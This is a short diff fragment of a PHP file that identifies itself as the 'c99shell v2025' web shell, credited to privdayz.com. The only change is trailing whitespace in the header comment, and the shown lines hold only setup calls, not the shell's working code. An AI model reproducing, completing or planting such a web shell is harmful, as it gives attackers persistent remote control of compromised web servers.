@@ -1,7 +1,7 @@
 <?php
 /*
   c99shell v2025 - still here.
-  reborn by privdayz.com
+  reborn by privdayz.com 
 */
 @set_time_limit(0);
 @clearstatcache();
